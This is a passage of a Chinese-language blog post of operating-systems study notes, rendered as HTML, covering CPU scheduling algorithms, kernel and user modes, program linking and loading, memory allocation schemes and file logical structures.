短作业优先（SJF）"></a>4.1.7.3. 短作业优先（SJF）</h5><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605181346721.png"></p><hr><h5 id="4-1-7-4-高相应比优先（HRRN）"><a href="#4-1-7-4-高相应比优先（HRRN）" class="headerlink" title="4.1.7.4. 高相应比优先（HRRN）"></a>4.1.7.4. 高相应比优先（HRRN）</h5><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605181435348.png"><br>等待时间 &#x3D; 现在时间 - 到达时间，每次都要重新计算<br>响应比 &#x3D; （等待时间 + 服务时间）&#x2F;服务时间</p><hr><h5 id="4-1-7-5-优先级调度（PSA）"><a href="#4-1-7-5-优先级调度（PSA）" class="headerlink" title="4.1.7.5. 优先级调度（PSA）"></a>4.1.7.5. 优先级调度（PSA）</h5><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605181527733.png"></p><hr><h5 id="4-1-7-6-时间片轮转调度（RR）"><a href="#4-1-7-6-时间片轮转调度（RR）" class="headerlink" title="4.1.7.6. 时间片轮转调度（RR）"></a>4.1.7.6. 时间片轮转调度（RR）</h5><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605182208816.png"></p><hr><h5 id="4-1-7-7-多级反馈队列调度（MFQ）"><a href="#4-1-7-7-多级反馈队列调度（MFQ）" class="headerlink" title="4.1.7.7. 多级反馈队列调度（MFQ）"></a>4.1.7.7. 多级反馈队列调度（MFQ）</h5><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605182525623.png"></p><hr><h4 id="4-1-8-处理机的状态"><a href="#4-1-8-处理机的状态" class="headerlink" title="4.1.8. 处理机的状态"></a>4.1.8. 处理机的状态</h4><p>处理机的状态常见有：</p><ol><li>&#x3D;&#x3D;用户态（目态）&#x3D;&#x3D;：<ol><li>CPU 只能执行非特权指令</li></ol></li><li>核心态(管态、内核态)：<ol><li>CPU 可以执行所有指令</li></ol></li><li>用户态 -&gt; 核心态：<ol><li>通过中断（硬件完成）</li></ol></li><li>核心态 -&gt; 用户态：<ol><li>特权指令 psw 的标志位，0 用户态，1 核心态（仅作了解）</li></ol></li></ol><hr><h4 id="4-1-9-调度的常见算法"><a href="#4-1-9-调度的常见算法" class="headerlink" title="4.1.9. 调度的常见算法"></a>4.1.9. 调度的常见算法</h4><ol><li>&#x3D;&#x3D;先来先服务（FCFS）&#x3D;&#x3D;：<ol><li>按进入就绪队列的顺序调度，简单但对长作业不利。</li></ol></li><li>&#x3D;&#x3D;短作业优先（SJF）&#x3D;&#x3D;：<ol><li>优先调度运行时间短的作业，平均等待时间最小，但可能导致长作业“饿死”。</li></ol></li><li>&#x3D;&#x3D;优先级调度&#x3D;&#x3D;：<ol><li>根据优先级来调度，高优先级先运行，可能饿死低优先级进程。</li></ol></li><li>&#x3D;&#x3D;高响应比优先（HRN）&#x3D;&#x3D;：<ol><li>综合 FCFS 和 SJF，用响应比 R&#x3D;等待时间+要求服务时间要求服务时间 R &#x3D;（等待时间 + 要求服务时间） &#x2F; 要求服务时间 R&#x3D;要求服务时间等待时间+要求服务时间​ 来决定调度顺序，既考虑了等待时间又兼顾了作业长短。</li></ol></li><li>&#x3D;&#x3D;多级反馈队列调度&#x3D;&#x3D;：<ol><li>结合时间片轮转、优先级和反馈机制，是目前最灵活、复杂、也是最常见的一种调度策略。</li></ol></li></ol><hr><h2 id="5-存储器管理（内存管理）"><a href="#5-存储器管理（内存管理）" class="headerlink" title="5. 存储器管理（内存管理）"></a>5. 存储器管理（内存管理）</h2><h3 id="5-1-存储器的结构"><a href="#5-1-存储器的结构" class="headerlink" title="5.1. 存储器的结构"></a>5.1. 存储器的结构</h3><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250604120028051.png"></p><hr><h3 id="5-2-进程运行的原理"><a href="#5-2-进程运行的原理" class="headerlink" title="5.2. 进程运行的原理"></a>5.2. 进程运行的原理</h3><h4 id="5-2-1-程序装入内存过程图示（要转为进程）"><a href="#5-2-1-程序装入内存过程图示（要转为进程）" class="headerlink" title="5.2.1. 程序装入内存过程图示（要转为进程）"></a>5.2.1. 程序装入内存过程图示（要转为进程）</h4><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250604123703414.png"></p><hr><h4 id="5-2-2-编译阶段"><a href="#5-2-2-编译阶段" class="headerlink" title="5.2.2. 编译阶段"></a>5.2.2. 编译阶段</h4><p>程序的编译，是将源代码转化为机器能够理解或执行的形式。例如：</p><ol><li>C&#x2F;C++ 是直接面向底层硬件的语言，其编译产物是机器码，通常为 <code>.o</code>、<code>.obj</code> 等目标文件；</li><li>而 Java 编译的对象是 JVM 虚拟机，因此其编译产物是 <code>.class</code> 字节码文件。<br>在编译过程中，像 Java 这样的语言，通常是一个类或接口就生成一个独立的字节码文件，编译产物较为分散。</li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>这里的库包括操作系统自带的共享库（如文件库、I&#x2F;O 库等，均由操作系统提供）、内置库（例如 C 语言自带的标准库）以及第三方依赖库</li></ol></blockquote><hr><h4 id="5-2-3-链接阶段"><a href="#5-2-3-链接阶段" class="headerlink" title="5.2.3. 链接阶段"></a>5.2.3. 链接阶段</h4><p>程序链接主要有三种方式：</p><ol><li>&#x3D;&#x3D;静态链接&#x3D;&#x3D;：<ol><li>发生在程序编译生成可执行文件的时候，编译器会把程序本身需要的所有库函数和模块代码，全部一次性打包进最终的可执行文件里</li><li>程序启动速度快，因为所有代码都已经在一个文件里，运行时不用再去找外部库</li><li>但生成的程序文件体积比较大，而且如果库文件有更新，必须重新编译并链接程序，才能用上新库</li></ol></li><li>&#x3D;&#x3D;装入时动态链接（装入时链接）&#x3D;&#x3D;：<ol><li>发生在程序装入内存阶段，也就是程序启动时。</li><li>程序代码存于可执行文件中，但库函数代码在程序启动时，由操作系统帮忙加载到内存。</li><li>本质上，在程序启动时，操作系统会把所有依赖的共享库映射进程序的虚拟地址空间（程序的虚拟内存地址空间与库文件在磁盘上的位置进行映射）。调用库函数时，实际上是访问这个虚拟地址，当我们访问这个虚拟地址的时候，操作系统才会把对应的数据从磁盘加载到内存</li><li>多个程序共用同一套共享库时，它们映射到同一份物理内存，库代码只存一份，节省了内存资源，无需为每个程序复制一份库函数</li><li>这样可执行文件体积相对小，因为不包含库代码，而是运行时加载</li><li>如果库更新了，下次启动程序时就自动用到新版本的库，无需重新编译程序</li><li><strong>绑定到共享库中这些函数的地址上</strong>。</li></ol></li><li>&#x3D;&#x3D;运行时动态链接（运行时链接）&#x3D;&#x3D;：<ol><li>在程序运行过程中，只有当程序真正调用某个库函数时，系统才去加载并链接对应的库。</li><li>这样程序启动更快，内存使用更灵活，未调用的库代码不会被加载。</li><li>表面上与装入时动态链接相似，但装入时动态链接是在程序启动时就映射所有库的地址空间，代码按需加载。</li><li>而运行时动态链接则是“调用时才映射和链接”，库的加载和链接延迟到实际调用时才发生。</li></ol></li></ol><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605231317732.png"><br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605231335064.png"><br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605231518546.png"></p><hr><h4 id="5-2-4-装入阶段"><a href="#5-2-4-装入阶段" class="headerlink" title="5.2.4. 装入阶段"></a>5.2.4. 装入阶段</h4><p>程序装入主要有三种方式：</p><ol><li>&#x3D;&#x3D;绝对装入&#x3D;&#x3D;：<ol><li>程序在编译时就确定了它的大小，生成的代码中装入的物理内存地址是固定的。</li><li>通常由程序设计者明确指定装入地址（比如 0~12），程序就按这个地址装入，对程序员要求较高</li><li>装入速度快，运行效率高，但灵活性差。如果内存位置发生变化，比如 0~12 被占用，程序就无法启动</li><li>适合早期的单道处理环境，因为进程数量和内存分配情况明确，程序知道自己可以装入哪个内存区域；但多道处理时，内存分配复杂且动态，难以保证空闲内存位置</li></ol></li><li>&#x3D;&#x3D;可重定向装入（静态重定位装入）&#x3D;&#x3D;：<ol><li>程序在编译时仍需确定大小，但物理装入地址可以改变，程序通过修正代码中地址引用（重定位）来适应实际分配的内存</li><li>比如程序逻辑地址为 0<del>12，但是物理内存地址 0</del>12 被占用，那么可以重定位到空闲的物理内存地址 13~25</li><li>这样程序可以装入不同内存区域，灵活性较绝对装入更高</li><li>适合多道处理的早期阶段，但仍需预先知道程序大小，不适合动态装入</li></ol></li><li>&#x3D;&#x3D;动态运行时装入（动态重定位装入）&#x3D;&#x3D;：<ol><li>程序运行时不一次性全部加载所有库，而是在需要时动态加载，对应装入时链接和运行时链接机制</li></ol></li></ol><hr><h3 id="5-3-内存管理"><a href="#5-3-内存管理" class="headerlink" title="5.3. 内存管理"></a>5.3. 内存管理</h3><h4 id="5-3-1-内存管理概述"><a href="#5-3-1-内存管理概述" class="headerlink" title="5.3.1. 内存管理概述"></a>5.3.1. 内存管理概述</h4><p>内存管理主要涉及内存的分配，通常包括：</p><ol><li>内存的连续分配方式</li><li>内存的非连续分配方式<br>除此之外，我们还会介绍内存扩充的方法，主要针对程序体积较大、内存不足的情况。</li></ol><hr><h4 id="5-3-2-内存的连续分配方式"><a href="#5-3-2-内存的连续分配方式" class="headerlink" title="5.3.2. 内存的连续分配方式"></a>5.3.2. 内存的连续分配方式</h4><h5 id="5-3-2-1-内存的连续分配方式概述"><a href="#5-3-2-1-内存的连续分配方式概述" class="headerlink" title="5.3.2.1. 内存的连续分配方式概述"></a>5.3.2.1. 内存的连续分配方式概述</h5><p>内存的连续分配方式有：</p><ol><li>单一连续分配</li><li>固定分区分配</li><li>动态分区分配</li></ol><hr><h5 id="5-3-2-2-单一连续分配"><a href="#5-3-2-2-单一连续分配" class="headerlink" title="5.3.2.2. 单一连续分配"></a>5.3.2.2. 单一连续分配</h5><p>这是最简单的内存分配方式：系统将除系统保留区之外的所有可用内存合并为一个连续的大分区，供单个进程独占使用。换句话说，内存划分为“系统区”和“一个大用户区”，所有用户程序都只能在该用户区内执行。</p><p>优点是：</p><ol><li>实现简单，管理方便</li><li>无需复杂的内存分配算法，只需将整块用户区一次性分配给一个进程，无需再划分多个小块</li><li>无外部碎片，不存在外部空闲空间被分割成零散的碎片（因为根本不存在外部空间了）</li><li>不一定需要内存保护，因为只有一个用户进程运行，不涉及多个用户进程之间的隔离。但仍需注意系统区与用户区之间的访问安全（所以是不一定需要，而不是一定不需要）</li></ol><p>缺点是：</p><ol><li>只能同时运行一个程序，存储器利用率低</li><li>程序大小受限于整个内存容量，超出部分无法加载（可以使用内存扩充技术）</li><li>有内部碎片，程序实际使用的内存往往小于整块分区，导致部分空间浪费<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250606111536575.png"></li></ol><hr><h5 id="5-3-2-3-固定分区分配"><a href="#5-3-2-3-固定分区分配" class="headerlink" title="5.3.2.3. 固定分区分配"></a>5.3.2.3. 固定分区分配</h5><p>系统将除系统保留区之外的所有可用内存划分为若干个大小固定的分区，<strong>每个分区独立供一个进程使用</strong>。</p><p>分区的大小、起始地址及分配状态由分区说明表记录（该表通常存放于系统区内存中）</p><p>优点是：</p><ol><li>实现相对简单，管理方便</li><li>分区数量和大小固定，不需要动态计算与调整，只需为进程选择合适的空闲分区即可，调度开销也较小</li><li>支持同时运行多个进程，相比单一连续分配，可将不同进程分别装入不同分区，提高并发性与利用率。</li></ol><p>缺点是：</p><ol><li>固定大小分区可能无法适配所有进程需求、<ol><li>若进程小于分区容量，则剩余部分无法被其它进程利用，导致空间浪费，内部碎片严重</li><li>若进程大于分区容量，则需要使用内存扩充技术（无法将多个分区合并成大分区）</li></ol></li><li>分区数量固定，扩展性差，如果可用分区都在使用，但有新进程要进入，必须等待或进行重启配置；若分区过剩，则部分分区长期空闲，降低利用率。</li></ol><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250606111950327.png"></p><hr><h5 id="5-3-2-4-动态分区分配"><a href="#5-3-2-4-动态分区分配" class="headerlink" title="5.3.2.4. 动态分区分配"></a>5.3.2.4. 动态分区分配</h5><p>系统将除系统保留区之外的所有可用内存视为一个整体的空闲区域。起初，当进程到来时，系统根据其需求划出相应大小的一块内存，这块区域即视为一个“分区”。该进程退出后，所占用的分区会重新变为新的空闲区。系统通过数据结构（如空闲区链表、空闲区表，该表通常存放于系统区内存中）记录当前所有空闲区的位置和大小。</p><p>当新进程请求内存时，系统会优先在现有空闲区中查找合适的连续空间进行分配。例如，若进程需要 6 KB，而找到的空闲区为 8 KB，则系统会从该空闲区划出 6  KB分配给进程，剩余的2KB则被划分为一个新的空闲区。需要注意的是，操作系统通常会设置一个最小分配单位（分配粒度），如果剩余空间小于该单位，则不会再进一步划分，以避免产生过多的碎片。</p><p>如果没有直接满足的空闲区，可以尝试将多个相邻的空闲区合并后再判断能否满足需求。如果仍无法满足，系统会从剩余空闲内存中为其划出一个新的分区。随着进程的不断装入与释放，内存中的空闲区数量与分布将动态变化。</p><p>优点是：</p><ol><li>消除了内部碎片，每次根据进程实际需求划分分区，分配空间更贴合实际，避免了固定分区中 “进程小于分区导致剩余空间浪费”的问题。</li><li>内存利用率高，空闲区可动态划分，无需预留固定大小的内存块，显著减少空间浪费。</li><li>分配策略灵活多样，通过不同的适应算法（如首次适应、最佳适应等），可以根据实际场景优化分配效率或降低外部碎片产生。</li><li>支持多个进程同时运行，相较于单一连续分配，只要存在足够大的空闲区，即可加载相应进程，提高并发能力和内存利用率。</li></ol><p>缺点是：</p><ol><li>存在外部碎片问题，随着进程频繁申请与释放内存，空闲区被切割成大小不一的碎片（例如：第1区空闲，第2、3区占用，第4区空闲），导致即使总体空闲空间充足，也可能找不到一块足够大的连续区域满足较大进程需求。</li><li>分配和回收开销较大，每次分配需遍历空闲区链表寻找合适空间，并可能拆分空闲区；回收时还需检查并合并相邻空闲区，增加了算法复杂度和执行时间。</li><li>内存管理复杂，需维护动态变化的空闲区表或链表（或位示图），实时更新状态。相比固定分区，数据结构更复杂，易出错且调试难度较高</li></ol><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250606132823514.png"></p><hr><h4 id="5-3-3-内存的非连续分配"><a href="#5-3-3-内存的非连续分配" class="headerlink" title="5.3.3. 内存的非连续分配"></a>5.3.3. 内存的非连续分配</h4><h5 id="5-3-3-1-基本分页存储管理"><a href="#5-3-3-1-基本分页存储管理" class="headerlink" title="5.3.3.1. 基本分页存储管理"></a>5.3.3.1. 基本分页存储管理</h5><p>基本分页存储管理和固定分区分配在形式上很相似，都是将内存划分为多个块。但不同的是，分页允许一个进程占用多个非连续的物理块，而固定分区分配中，一个块只能被一个进程占用；分页也不同于动态分区分配，后者要求找到一整块连续的空闲空间，而分页无需考虑物理内存的连续性。</p><p>操作系统将逻辑地址空间（即进程所需的虚拟内存空间）划分为若干个大小固定、长度相等的块，称为“页”（Page）；与之对应，物理内存也被划分成同样大小的块，称为“页框”（Frame）。</p><p>为了尽量减少内部碎片，每一页的大小通常设计得较小，这一点不同于固定分区分配中分区尺寸较大、容易产生未充分利用的剩余空间。每个进程维护一张页表（该页表保存在 进程PCB 中，由操作系统存放于系统内存区），用于记录逻辑页与物理页框之间的映射关系。</p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250606135102882.png"></p><hr><h5 id="5-3-3-2-基本分段存储管理"><a href="#5-3-3-2-基本分段存储管理" class="headerlink" title="5.3.3.2. 基本分段存储管理"></a>5.3.3.2. 基本分段存储管理</h5><p>一个应用，每个模块可能占用的内存不一样，如果我们像上面一样全部列出来，其实是不太好管理的<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250606140124152.png"></p><hr><h5 id="5-3-3-3-段页式管理方式"><a href="#5-3-3-3-段页式管理方式" class="headerlink" title="5.3.3.3. 段页式管理方式"></a>5.3.3.3. 段页式管理方式</h5><p>先分段再分页，一个进程一个段表，一个段表项一个页表，一个页表多个物理块</p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250606140256568.png"></p><hr><h4 id="5-3-4-内存的扩充"><a href="#5-3-4-内存的扩充" class="headerlink" title="5.3.4. 内存的扩充"></a>5.3.4. 内存的扩充</h4><p>内存扩充的常见手段有：</p><ol><li>&#x3D;&#x3D;覆盖&#x3D;&#x3D;：<ol><li>当内存仅有 1G，而程序需占用 2G 时，无法一次性装入全部内容。此时可让常用的常驻内存，不常用的在需要时覆盖式加载</li></ol></li><li>&#x3D;&#x3D;交换&#x3D;&#x3D;：<ol><li>当内存空间紧张时，可以将部分内存中的进程暂时换出到外存（挂起），再将外存中已准备好运行的进程换入内存。</li></ol></li><li>&#x3D;&#x3D;虚拟内存&#x3D;&#x3D;：<ol><li>详见下文 “虚拟内存管理” 部分</li></ol></li></ol><hr><h3 id="5-4-虚拟内存管理"><a href="#5-4-虚拟内存管理" class="headerlink" title="5.4. 虚拟内存管理"></a>5.4. 虚拟内存管理</h3><hr><h2 id="6-文件管理"><a href="#6-文件管理" class="headerlink" title="6. 文件管理"></a>6. 文件管理</h2><h3 id="6-1-文件概述"><a href="#6-1-文件概述" class="headerlink" title="6.1. 文件概述"></a>6.1. 文件概述</h3><p>文件是信息在计算机系统中的基本存储单位，通常以计算机硬盘等存储介质为载体，用于组织和管理数据。它是用户与操作系统交互、存储数据和程序的主要方式。</p><hr><h3 id="6-2-文件的属性"><a href="#6-2-文件的属性" class="headerlink" title="6.2. 文件的属性"></a>6.2. 文件的属性</h3><p>文件具有一组用于描述其状态和管理信息的属性，包括但不限于：文件名、文件类型、文件大小、存储位置、访问权限等等<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250604145748064.png"></p><hr><h3 id="6-3-文件的操作"><a href="#6-3-文件的操作" class="headerlink" title="6.3. 文件的操作"></a>6.3. 文件的操作</h3><p>操作系统为用户和程序提供了多种文件操作接口，主要包括：创建文件、打开与关闭文件、读写文件、文件定位（寻址）、删除文件、截断文件</p><hr><h3 id="6-4-文件的结构"><a href="#6-4-文件的结构" class="headerlink" title="6.4. 文件的结构"></a>6.4. 文件的结构</h3><h4 id="6-4-1-文件的逻辑结构"><a href="#6-4-1-文件的逻辑结构" class="headerlink" title="6.4.1. 文件的逻辑结构"></a>6.4.1. 文件的逻辑结构</h4><h5 id="6-4-1-1-文件的逻辑结构概述"><a href="#6-4-1-1-文件的逻辑结构概述" class="headerlink" title="6.4.1.1. 文件的逻辑结构概述"></a>6.4.1.1. 文件的逻辑结构概述</h5><p>文件的逻辑结构是从用户和程序员的角度来看，文件内部数据的组织方式，而不涉及它在磁盘上的物理排布。</p><hr><h5 id="6-4-1-2-无结构文件（流式文件）"><a href="#6-4-1-2-无结构文件（流式文件）" class="headerlink" title="6.4.1.2. 无结构文件（流式文件）"></a>6.4.1.2. 无结构文件（流式文件）</h5><p>无结构文件指的是文件<strong>内部的数据没有固定的组织结构</strong>，系统将其中的数据按字节（Byte）为单位、顺序排列进行存储。操作系统并不会对这些字节的内容做出任何解释或假设，具体的含义和格式完全依赖于应用程序根据需求进行解析。</p><p>举个例子，像我们日常使用的 <code>.txt</code> 文本文件、<code>.java</code> 源代码文件，它们在逻辑上就是典型的无结构文件。我们可以在文件的任意位置自由地插入数据、添加注释或修改内容，不受字段格式、记录长度等结构约束——想写哪里就写哪里，非常灵活。</p><p>也正因为它“无结构”，它的操作非常灵活、简单，尤其适合顺序访问。但与此同时也存在缺点：由于缺乏内部组织，若我们希望定位某一特定数据（比如某一行、某个关键字），就只能通过穷举扫描（如全文搜索）的方式查找。这种方式在小文件中影响不大，但在处理大规模数据或频繁查找时，效率就会显得不足。<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250604170710743.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li>无论是无结构文件（如 <code>.txt</code>、<code>.java</code>、<code>.jpg</code> 等），还是有结构文件（如 <code>.csv</code>、<code>.ibd</code> 等），对操作系统来说，本质上都是普通的字节序列文件。操作系统并不关心文件内容是中文、Java 代码，还是 Markdown，或者是否有特定结构。<ol><li>以 <code>.txt</code> 文件为例，当我们使用 Notepad++ 保存文件时，Notepad++ 会根据选定的字符编码方式（例如 UTF-8，不同编码方式会将字符转换为不同的二进制码）将文本内容转换成对应的二进制字节序列（1 字节 &#x3D; 8 位二进制，8 bit）。这个编码过程完全由应用程序内部完成。</li><li>随后，操作系统接收这些二进制字节序列，通过文件系统（如 NTFS、ext4 等）将它们写入硬盘的具体位置。操作系统负责管理磁盘空间分配、缓存处理以及更新文件的元数据（例如文件大小、修改时间等）。</li><li>当 Notepad++ 需要读取该文件时，操作系统从磁盘加载相应的二进制字节序列到内存，并通过系统提供的接口供程序访问。Notepad++ 再按照其内部逻辑将这些字节解析并显示为可读的文字内容。</li></ol></li><li>也就是说，操作系统的职责仅是接收并存储二进制字节序列，使其成为硬盘上的文件，或将文件内容加载到内存供程序使用。那么，为什么还要区分无结构文件和有结构文件呢？<ol><li>这其实是从程序设计角度出发的分类</li><li>对于无结构文件，程序若要定位某部分内容，只能通过逐字节或全文扫描的方式进行查找，效率较低</li><li>而对于有结构文件（例如每条记录固定为 256 字节），程序可以根据记录大小计算出某条记录在文件中的具体字节偏移，从而快速定位到目标记录，无需进行全文扫描，访问效率大大提高</li></ol></li></ol></blockquote><hr><h5 id="6-4-1-3-有结构文件（记录式文件）"><a href="#6-4-1-3-有结构文件（记录式文件）" class="headerlink" title="6.4.1.3. 有结构文件（记录式文件）"></a>6.4.1.3. 有结构文件（记录式文件）</h5><h6 id="6-4-1-3-1-有结构文件概述"><a href="#6-4-1-3-1-有结构文件概述" class="headerlink" title="6.4.1.3.1. 有结构文件概述"></a>6.4.1.3.1. 有结构文件概述</h6><p>这类文件由若干条结构化记录组成，每条记录可以是固定长度或变长的。其优点是结构明确，便于快速定位和访问特定记录；缺点是灵活性较差，不适合存储复杂多样的数据格式。</p><p>例如，CSV 文件中每一行代表一条记录，字段之间用逗号分隔，应用程序通常按记录单位进行处理：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>,name,score<br><span class="hljs-attribute">101</span>,Anna,<span class="hljs-number">88</span><br><span class="hljs-attribute">102</span>,Bob,<span class="hljs-number">92</span><br></code></pre></td></tr></table></figure><p>再如日志文件，每条日志也是一条记录，由固定格式的字段组成：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2025</span>-<span class="hljs-number">06</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">30</span>:<span class="hljs-number">22</span> | user: alice | action: login<br><span class="hljs-attribute">2025</span>-<span class="hljs-number">06</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">35</span>:<span class="hljs-number">00</span> | user: bob | action: logout<br></code></pre></td></tr></table></figure><p>有结构文件大致分为：</p><ol><li>顺序文件</li><li>索引文件</li><li>索引顺序文件</li><li>直接文件（散列文件、Hash 文件）</li></ol><hr><h6 id="6-4-1-3-2-顺序文件"><a href="#6-4-1-3-2-顺序文件" class="headerlink" title="6.4.1.3.2. 顺序文件"></a>6.4.1.3.2. 顺序文件</h6><p>顺序文件又可分为变长顺序文件和定长顺序文件：</p><ol><li>&#x3D;&#x3D;变长顺序文件&#x3D;&#x3D;：<ol><li>每条记录的长度不固定，例如 <code>.csv</code> 文件，字段之间用逗号分隔，不同记录的长度可能不同，程序通常逐行读取并解析。</li></ol></li><li>&#x3D;&#x3D;定长顺序文件&#x3D;&#x3D;：<ol><li>每条记录长度相同，便于通过字节偏移直接定位记录，例如数据库的 <code>.ibd</code> 文件，虽然实际插入的数据可能大小不一，但我们都申请了固定空间（如 <code>VARCHAR(20)</code> ），整体上形成了定长的存储布局。<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250604182339375.png"></li></ol></li></ol><hr><h6 id="6-4-1-3-3-索引文件"><a href="#6-4-1-3-3-索引文件" class="headerlink" title="6.4.1.3.3. 索引文件"></a>6.4.1.3.3. 索引文件</h6><p>文件中建立了独立索引结构（如索引表或索引块，索引与数据分离），不仅可以通过 “关键字 → 字节偏移” 的方式快速定位记录，还可以实现变长，如我们 MySQL 的 <code>.MYI</code> 文件<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250604182536954.png"></p><hr><h6 id="6-4-1-3-4-索引顺序文件"><a href="#6-4-1-3-4-索引顺序文件" class="headerlink" title="6.4.1.3.4. 索引顺序文件"></a>6.4.1.3.4. 索引顺序文件</h6><p>索引顺序文件是顺序文件 + 索引结构的结合，既可以按顺序遍历，也可以按索引跳转定位。<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250604190000531.png"></p><p>当数据量非常大时，一个单层索引表所能覆盖的记录数量是有限的。为了解决这个问题，我们可以采用多级索引结构：在原有索引表之上再建立更高一层的索引，用于索引“索引表”。<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250604190222746.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li>例如，若每个索引项占 16 字节，常见的页大小为 4KB（即 4096 字节），则一个索引页最多可容纳 <code>4096 ÷ 16 = 256</code> 个索引项。</li><li>当数据记录数量远超单页索引容量时，就需要在索引项之上再构建一层索引，形成多级索引结构。</li></ol></blockquote><hr><h6 id="6-4-1-3-5-直接文件（散列文件、Hash-文件）"><a href="#6-4-1-3-5-直接文件（散列文件、Hash-文件）" class="headerlink" title="6.4.1.3.5. 直接文件（散列文件、Hash 文件）"></a>6.4.1.3.5. 直接文件（散列文件、Hash 文件）</h6><p>用哈希函数将关键字直接映射到物理地址或记录的偏移位置，实现近似 O(1) 的随机访问，例如 Redis 的 <code>.rdb</code> 文件<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250604190620867.png"></p><hr><h5 id="6-4-1-4-文件的目录结构"><a href="#6-4-1-4-文件的目录结构" class="headerlink" title="6.4.1.4. 文件的目录结构"></a>6.4.1.4. 文件的目录结构</h5><h6 id="6-4-1-4-1-文件的目录结构概述"><a href="#6-4-1-4-1-文件的目录结构概述" class="headerlink" title="6.4.1.4.1. 文件的目录结构概述"></a>6.4.1.4.1. 文件的目录结构概述</h6><p>文件的目录结构是指操作系统或文件系统用来组织和管理文件层级关系的方式。常见的目录结构有：</p><ol><li>单级目录结构</li><li>二级目录结构</li><li>树形目录结构</li><li>无环图（DAG）目录结构</li></ol><p>而在实现这些结构时，文件系统内部还需要维护每个文件的元数据信息，常用的数据结构包括：</p><ol><li>文件控制块（FCB）</li><li>索引节点（inode）</li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>FCB 和 inode 不是同一个东西，它们都是用于管理文件的元数据结构，但属于不同的文件系统设计方式。</li></ol></blockquote><hr><h6 id="6-4-1-4-2-文件控制块（FCB）"><a href="#6-4-1-4-2-文件控制块（FCB）" class="headerlink" title="6.4.1.4.2. 